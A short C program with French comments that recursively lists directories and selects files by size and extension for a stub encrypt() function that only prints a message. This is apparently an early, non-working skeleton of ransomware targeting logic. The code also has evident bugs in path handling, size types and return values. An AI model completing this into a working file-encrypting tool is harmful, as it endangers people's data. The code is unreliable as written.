#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>


int stat_file(const char* name){
	struct stat stat_file;
	stat(name, &stat_file);
	int size = stat_file.st_size;
	printf("file size: %d\n", size);
	if (size >=8796093022208){
		return 1;
	}
	else{
		return 0;
	}
}

int extension_file(const char* name){
	const char* ext = strrchr(name, '.'); /*prend la dernière occurence de '.' */
	if(!ext){
		
	}
	else{
		printf("extension is %s\n", ext +1); /* comprendre ext +1*/
		if (strcmp((ext +1), "mp3") == 0 || strcmp((ext +1), "mp4") == 0){
			return 1;
			printf("ici \n");
		}
		else{
			return 0;
		}
	}

}

int encrypt(const char* path){
	printf("on va au chiffrement \n");
}

int ls(const char* name){
	DIR* dir = opendir(name);
	printf("Reading files in: %s\n", name);
	if (dir == NULL){ 
		return 1;
		}
	struct dirent* entity;
	entity = readdir(dir);
	while(entity != NULL ){
		printf("%d %s\n", entity->d_type , entity->d_name);
		int rule1 = stat_file(entity->d_name);
		int rule2 = extension_file(entity->d_name);
		printf("respet des regles %d %d \n", rule1, rule2);
		/* problème gestion d_type, ne donne que 8 et 4 et pas le reste*/
		if (entity->d_type == DT_DIR && strcmp(entity->d_name, ".") != 0 && strcmp(entity->d_name, "..") != 0){
			char path[100] = {0};    /*Peut-être une alocation dynamique si possible*/
			strcat(path, name);
			strcat(path, "/");
			strcat(path, entity->d_name);
			ls(path);
		}
		else{if(rule1 == 0 && rule2 == 0){
				encrypt(name);
			} 
		}
		entity = readdir(dir);
	}
	closedir(dir);
	return 0;
}

void main(){
	ls(".");
}


